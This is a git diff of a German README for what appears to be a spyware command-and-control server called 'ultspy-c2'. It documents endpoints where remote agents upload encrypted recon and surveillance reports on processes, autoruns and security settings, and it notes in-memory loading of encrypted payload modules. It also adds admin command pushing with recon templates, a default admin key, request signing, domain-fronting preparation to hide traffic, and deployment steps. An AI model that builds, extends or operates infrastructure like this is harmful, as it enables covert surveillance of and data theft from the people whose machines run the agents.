@@ -48,9 +48,33 @@ GET /payload/<uuid>/<module>
 ```
 Der Server liefert verschlüsselte Module, welche der gehärtete Loader im Arbeitsspeicher entschlüsselt und lädt.
 
+## Recon Daten
+``` 
+POST /recon/<uuid>
+{ "data": "<base64 AES(iv+json)>" }
+```
+Der verschlüsselte Recon-Bericht wird gespeichert und kann zu Debug-Zwecken entschlüsselt ausgegeben werden.
+Das Deploy-Build übermittelt über `RECON_ADV` zusätzlich detaillierte Hardware- und Sicherheitsinformationen im selben Format.
+
+## Active Surveillance Report
+```
+POST /surveillance_report/<uuid>
+{ "data": "<base64 AES(iv+json)>" }
+```
+Der verschlüsselte Überwachungsbericht enthält laufende Prozesse, Autoruns und Sicherheitsinformationen.
+
 ## Admin Endpoints
 
-Für administrative Aufgaben steht ein einfacher API-Key geschützter Zugriff zur Verfügung. Der Key wird über den HTTP-Header `X-API-KEY` übermittelt.
+### Login
+```
+POST /login
+{ "api_key": "changemeadmin" }
+-> { "token": "<jwt>" }
+```
+
+Das erhaltene JWT muss innerhalb einer Stunde verwendet werden.
+
+Administratoren melden sich über `/login` mit einem API-Key an und erhalten ein JWT. Die Schlüssel werden seit Version 5 in einer Datenbank gespeichert und können per API verwaltet werden. Das JWT wird im Header `Authorization: Bearer <token>` an alle `/admin/*` Endpoints angehängt. Abgelaufene oder ungültige Tokens führen zu `401 Unauthorized` und erfordern einen erneuten Login.
 
 ### Agents auflisten
 ```
@@ -61,8 +85,12 @@ GET /admin/agents
 ### Logs eines Agents
 ```
 GET /admin/logs/<uuid>
--> { "logs": [{"message": "...", "timestamp": "..."}] }
+-> { "logs": [
+     {"timestamp":"2025-06-05T20:00:00Z","type":"Recon","description":"Recon data","data":"{...}"},
+     {"timestamp":"2025-06-05T20:01:00Z","type":"Info","description":"heartbeat"}
+   ] }
 ```
+Ein Eintrag enthält Zeitstempel (UTC), Typ des Eintrags (Recon, Surveillance, Info, Fehler usw.), eine Kurzbeschreibung und optional Rohdaten.
 
 ### Kommando pushen
 ```
@@ -71,9 +99,105 @@ POST /admin/command/<uuid>
 ```
 Identisch zu `/command/<uuid>`, aber nur mit gültigem API-Key erreichbar.
 
+### Aktuelle Server-Konfiguration
+```
+GET /admin/config
+-> {
+     "api_keys": ["default"],
+     "heartbeat_timeout": 180,
+     "versions": {"backend": "dev", "frontend": "0.0.0"},
+     "targets": ["localhost"],
+     "allowed_hosts": ["localhost"]
+   }
+```
+Listet die wichtigsten Einstellungen des Backends wie Heartbeat-Timeout und konfigurierte Zielhosts auf. Die API-Keys werden nur maskiert ausgegeben.
+
+### Kommando-Templates
+
+Wiederkehrende Befehle lassen sich als Vorlage speichern und später schnell abrufen:
+
+```
+GET /admin/templates
+-> { "templates": [{"template_id":"...","name":"Daily Recon","command":"RECON","parameters":{}}] }
+
+POST /admin/templates
+{ "name": "Daily Recon", "command": "RECON", "parameters": {} }
+-> { "template_id": "<id>" }
+
+DELETE /admin/templates/<template_id>
+-> { "status": "deleted" }
+```
+
+Der Name eines Templates muss eindeutig sein. Bei Dopplern liefert der Server `409 Conflict`.
+
+### API Keys verwalten
+
+API-Schlüssel können über folgende Endpunkte administriert werden:
+
+```bash
+GET /admin/apikeys
+-> { "keys": [{"id":"...","name":"Admin","created_at":"...","last_used_at":"...","last_ip":"1.2.3.4"}] }
+
+POST /admin/apikeys
+{ "name": "Operator" }
+-> { "id": "...", "secret": "<only shown once>" }
+
+DELETE /admin/apikeys/<id>
+-> { "status": "revoked" }
+```
+
+Das ausgegebene Geheimnis bei der Erstellung wird nur ein einziges Mal angezeigt und muss sicher abgelegt werden.
+
+Alle Aktionen werden in einer Audit-Tabelle protokolliert. Darunter erfolgreiche und fehlgeschlagene Logins sowie das Erstellen und Revoken von Schlüsseln.
+Abrufen der letzten Einträge:
+
+```bash
+GET /admin/audit_logs
+-> { "logs": [{"timestamp":"...","action":"login_success","key_id":"...","ip":"1.2.3.4"}] }
+```
+
+Das Skript `cleanup_keys.py` listet API-Schlüssel, die länger als 90 Tage nicht benutzt wurden.
+
+## API Hardening
+Alle Agent-Requests tragen ab Version 4 eine HMAC-SHA256-Signatur. Zusätzlich wird pro Aufruf ein einmaliger Nonce sowie ein Zeitstempel übertragen:
+
+- `X-ULTSPY-Signature`
+- `X-ULTSPY-Nonce`
+- `X-ULTSPY-Timestamp`
+
+Der Server verifiziert die Signatur anhand des pro Client hinterlegten AES-Schlüssels, prüft die Zeitabweichung (±60s) und lehnt doppelte Nonces ab.
+
 ```
 pip install -r requirements.txt
 python app.py
 ```
 
-Der API-Key kann über die Umgebungsvariable `ADMIN_API_KEY` gesetzt werden (Standard: `changeme`).
+Bei früheren Versionen wurden die API-Schlüssel in `config.json` gespeichert. Ab Version 5 müssen diese einmalig in die Datenbank überführt werden:
+```bash
+python migrate_keys.py
+```
+Danach können neue Schlüssel über die `/admin/apikeys`-Schnittstelle erzeugt werden. Beim Login muss ein gültiger Schlüssel angegeben werden. Anschließend werden alle Admin-Aufrufe mit `Authorization: Bearer <token>` durchgeführt.
+
+## Domain Fronting Vorbereitung
+
+In `config.json` lässt sich eine Liste erlaubter Hostnamen konfigurieren. Bei eingehenden Anfragen prüft der Server den `Host`-Header und lehnt unbekannte Hosts ab. Über `/config/targets` kann die aktuelle Routing-Tabelle abgefragt werden.
+Beispiel `config.json`:
+```json
+{
+  "allowed_hosts": ["localhost", "example.cloudfront.net"]
+}
+```
+
+## Deployment
+
+1. Create a virtual environment and install dependencies:
+```bash
+python -m venv /srv/ultspy-c2/venv
+source /srv/ultspy-c2/venv/bin/activate
+pip install -r requirements.txt
+```
+2. Start the API using Gunicorn:
+```bash
+gunicorn -w 4 -b 0.0.0.0:5000 wsgi:app
+```
+This will expose the Flask app via WSGI. The server logs to STDOUT and can be combined with a process manager and proxy such as Nginx.
